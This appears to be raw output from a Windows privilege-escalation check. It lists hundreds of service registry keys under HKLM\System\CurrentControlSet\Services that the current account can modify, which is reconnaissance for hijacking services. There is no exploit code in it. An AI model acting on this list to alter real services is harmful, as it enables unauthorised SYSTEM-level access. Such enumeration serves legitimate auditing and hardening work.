You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET_4.0.30319                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\aspnet_state                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AsyncMac                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\atapi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AudioEndpointBuilder                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Audiosrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSLiteAgent                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSNVMe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\b06bdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicDisplay                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicRender                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BattC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Beep                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadfcoei                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BFE                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BITS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bowser                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BrokerInfrastructure                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Browser                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxfcoe                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxois                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdrom                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CertPropSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cht4vbd                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CLFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_32               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_64               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CmBatt                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CNG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CngHwAssist                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CompositeBus                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\COMSysApp                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\condrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\crypt32                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CryptSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DCLocator                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\defragsvc                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceAssociationService                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceInstall                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dfsc                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dhcp                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\disk                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dmvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dnscache                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dot3svc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\drmkaud                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DsmSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DXGKrnl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\E1G60                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Eaphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ebdrv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ec2Config                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EFS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxfcoe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxstor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ErrDev                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ESENT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventLog                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventSystem                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\exfat                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fastfat                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fcvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdc                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdPHost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FDResPub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FileInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Filetrace                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\flpydisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FltMgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FontCache                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FsDepends                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Fs_Rec                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FxPPM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gagp30kx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gencounter                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\GPIOClx0101                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HdAudAddService                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HDAudBus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidBatt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hidserv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidUsb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hkmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HpSAMD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HTTP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hwpolicy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hyperkbd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HyperVideo                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\i8042prt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorAV                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ibbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IEEtwCollectorService                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IKEEXT                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\inetaccs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\InetInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelide                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelppm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IpFilterDriver                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iphlpsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPMIDRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPNAT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\isapnp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iScsiPrt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kdnic                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KeyIso                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KPSSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecPkg                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ksthunk                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KtmRm                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanServer                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanWorkstation                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ldap                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdio                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lmhosts                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Lsa                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS3                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SSS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\luafv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasas                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mlx4_bus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MMCSS                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Modem                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\monitor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mountmgr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mpsdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MpsSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb10                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb20                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsBridge                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Msfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidkmdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidumdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msisadrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSiSCSI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msiserver                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSKSSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsLbfoProvider                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPCLOCK                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPQM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsRPC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mssmbios                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSTEE                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MTConfig                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Mup                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mvumis                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\napagent                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NcaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ndfltr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDIS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisCap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisImPlatform                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisTapi                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ndisuio                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisVirtualBus                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisWan                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDISWANLEGACY                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDProxy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBIOS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netlogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netman                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netprofm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetTcpPortSharing                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netvsc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NlaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Npfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\npsvctrig                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsi                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsiproxy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NTDS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ntfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Null                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvraid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nv_agp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Parport                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\partmgr                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pci                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pciide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcmcia                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcw                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pdc                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PEAUTH                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfDisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfHost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfNet                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfOS                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfProc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pla                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PlugPlay                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PolicyAgent                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PortProxy                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Power                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PptpMiniport                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PrintNotify                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Processor                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ProfSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Psched                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PsShutdownSvc                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql2300i                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql40xx2i                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\qlfcoei                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAcd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAgileVpn                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAuto                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Rasl2tp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasMan                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasPppoe                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasSstp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdbss                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDMANDK                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdpbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPDR                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPNP                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPUDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RdpVideoMiniport                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ReFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteRegistry                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcEptMapper                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcLocator                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RSoPProv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rspndr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\s3cap                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacsvr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sbp2port                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCardSvr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ScDeviceEnum                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\scfilter                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Schedule                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCPolicySvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\secdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\seclogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SENS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx2                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serenum                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serial                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sermouse                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SessionEnv                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sfloppy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SharedAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ShellHWDetection                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid4                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smbdirect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMPTRAP                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\spaceport                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SpbCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Spooler                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sppsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv2                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srvnet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SSDPSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SstpSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stexstor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storahci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storflt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stornvme                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\svsvc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swenum                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swprv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SysMain                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SystemEventsBroker                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TapiSrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Tcpip                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6TUNNEL                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tcpipreg                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIPTUNNEL                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tdx                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\terminpt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TermService                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Themes                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\THREADORDER                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TieringEngineService                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TPM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TSDDD                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbFlt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbGD                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tsusbhub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tunnel                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uagp35                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UALSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UASPStor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UCX01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\udfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UEFI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UI0Detect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uliagpkx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\umbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmPass                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmRdpService                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\upnphost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbccgp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbehci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbhub                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBHUB3                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbohci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbprint                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBSTOR                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbuhci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBXHCI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VaultSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vdrvroot                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vds                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VerifierExt                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vhdmp                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\viaide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Vid                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VMBusHID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbusr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicguestinterface                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicheartbeat                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmickvpexchange                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicrdv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicshutdown                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmictimesync                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicvss                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgrx                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volsnap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpci                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpcivsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vsmraid                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSTXRAID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W32Time                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3logsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W3SVC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WacomPen                                     
